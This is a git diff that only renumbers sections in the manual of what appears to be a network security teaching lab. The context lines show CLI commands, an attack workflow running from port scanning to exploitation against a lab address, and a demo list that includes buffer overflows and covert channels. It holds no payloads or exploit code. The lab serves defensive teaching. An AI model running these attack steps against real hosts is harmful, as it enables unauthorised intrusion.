-### 30.3 CLI Usage (ironctl Prompt)
+### 31.3 CLI Usage (ironctl Prompt)
 
 ```
 ironctl> help                    # list all commands
@@ -2914,7 +3419,7 @@ ironctl> defense show            # show defense states
 ironctl> exit                    # graceful shutdown
 ```
 
-### 30.4 Verifying Connectivity
+### 31.4 Verifying Connectivity
 
 ```bash
 ping -c 3 10.0.1.1              # ICMP
@@ -2924,9 +3429,9 @@ echo "hello" | nc -w2 10.0.1.1 7  # TCP echo
 
 ---
 
-## 31. Running Attack Tools
+## 32. Running Attack Tools
 
-### 31.1 ironattack Subcommands Overview
+### 32.1 ironattack Subcommands Overview
 
 All attack commands require `sudo` (raw socket) except `exploit` (normal TCP).
 
@@ -2934,7 +3439,7 @@ All attack commands require `sudo` (raw socket) except `exploit` (normal TCP).
 sudo ./ironattack/ironattack --help
 ```
 
-### 31.2 Attack Workflow (Reconnaissance → Exploitation → Post-Exploitation)
+### 32.2 Attack Workflow (Reconnaissance → Exploitation → Post-Exploitation)
 
 ```
 1. RECONNAISSANCE: scan 10.0.1.1 1 10000 → find open ports
@@ -2944,11 +3449,11 @@ sudo ./ironattack/ironattack --help
 5. RE-TEST: repeat attack → confirm defense works
 ```
 
-### 31.3 Defense Enable/Disable Workflow
+### 32.3 Defense Enable/Disable Workflow
 
 Test attack without defense (baseline), enable defense, repeat attack, compare results.
 
-### 31.4 Attack-Defense Report (ironreport)
+### 32.4 Attack-Defense Report (ironreport)
 
 ```bash
 sudo ./ironprobe_ext/ironreport
@@ -2957,9 +3462,9 @@ sudo ./ironprobe_ext/ironreport
 
 ---
 
-## 32. Network Emulation (ironsim)
+## 33. Network Emulation (ironsim)
 
-### 32.1 Topology Configuration Format
+### 33.1 Topology Configuration Format
 
 ```
 node a ip 10.0.1.1/24
@@ -2969,18 +3474,18 @@ link a b delay 5ms
 link b c delay 10ms loss 1%
 ```
 
-### 32.2 2-Node and 3-Node Topologies
+### 33.2 2-Node and 3-Node Topologies
 
 ```bash
 sudo ./ironsim/ironsim                              # 2-node default
 sudo ./ironsim/ironsim ../src/configs/topo_3node.conf  # 3-node
 ```
 
-### 32.3 Link Impairments (Delay, Loss, Reorder)
+### 33.3 Link Impairments (Delay, Loss, Reorder)
 
 Applied via Linux `tc netem`. Configurable per-link in topology file.
 
-### 32.4 Traffic Testing (ironsim-test)
+### 33.4 Traffic Testing (ironsim-test)
 
 ```bash
 sudo ./ironsim/ironsim-test --all --count 10 --tcp 7
@@ -2988,9 +3493,9 @@ sudo ./ironsim/ironsim-test --all --count 10 --tcp 7
 
 ---
 
-## 33. Packet Capture and Replay (irontrace)
+## 34. Packet Capture and Replay (irontrace)
 
-### 33.1 Starting/Stopping Capture
+### 34.1 Starting/Stopping Capture
 
 ```
 ironctl> trace start /tmp/capture.pcap all
@@ -2998,11 +3503,11 @@ ironctl> trace stop
 ironctl> trace status
 ```
 
-### 33.2 pcap Format and Wireshark Compatibility
+### 34.2 pcap Format and Wireshark Compatibility
 
 Standard pcap format. Open with: `wireshark /tmp/capture.pcap` or `tcpdump -r /tmp/capture.pcap -XX`
 
-### 33.3 Replay Modes (Timed vs Fast, Internal vs External)
+### 34.3 Replay Modes (Timed vs Fast, Internal vs External)
 
 ```bash
 # External (realistic, via raw socket)
@@ -3012,19 +3517,19 @@ sudo ./irontrace/irontrace-replay --file /tmp/capture.pcap --iface iron0
 ironctl> trace replay /tmp/capture.pcap
 ```
 
-### 33.4 Regression Testing Workflow
+### 34.4 Regression Testing Workflow
 
 Capture → fix bug → replay → verify correct behavior.
 
 ---
 
-## 34. Demo Guide
+## 35. Demo Guide
 
-### 34.1 Demo File Organization (36 Self-Contained Demos)
+### 35.1 Demo File Organization (36 Self-Contained Demos)
 
 Each demo in `demos/` includes prerequisites, build steps, terminal instructions, and expected output.
 
-### 34.2 Quick Reference: Which Demo for Which Topic
+### 35.2 Quick Reference: Which Demo for Which Topic
 
 | Topic | Demos |
 |-------|-------|
@@ -3039,7 +3544,7 @@ Each demo in `demos/` includes prerequisites, build steps, terminal instructions
 | Buffer overflow | demo.31-33 |
 | Covert channels | demo.34-36 |
 
-### 34.3 Recommended Learning Path for Beginners
+### 35.3 Recommended Learning Path for Beginners
 
 ```
 Week 1: demo.01 → demo.02 → demo.04 (fundamentals)
@@ -3053,7 +3558,7 @@ Week 6: demo.34 → demo.35 → demo.36 (covert channels)
 ---
 
 
-## 35. Glossary of Terms
+## 36. Glossary of Terms
 
 ### Network Terminology
 
@@ -3118,7 +3623,7 @@ Week 6: demo.34 → demo.35 → demo.36 (covert channels)
 
 ---
 
-## 36. Protocol Reference Tables
+## 37. Protocol Reference Tables
 
 ### Ethernet Frame Format
 
@@ -3223,7 +3728,7 @@ Fixed: 28 bytes (after Ethernet header).
 
 ---
 
-## 37. Attack-Defense Matrix
+## 38. Attack-Defense Matrix
 
 | Attack | Tool Command | Defense | Defense Command | Effectiveness |
 |--------|-------------|---------|-----------------|---------------|
@@ -3246,7 +3751,7 @@ Fixed: 28 bytes (after Ethernet header).
 
 ---
 
-## 38. Port and Service Map
+## 39. Port and Service Map
 
 | Port | Protocol | Service | Binary | Purpose |
 |------|----------|---------|--------|---------|
@@ -3269,7 +3774,7 @@ Fixed: 28 bytes (after Ethernet header).
 
 ---
 
-## 39. References and Further Reading
+## 40. References and Further Reading
 
 ### RFCs (Protocol Specifications)
 
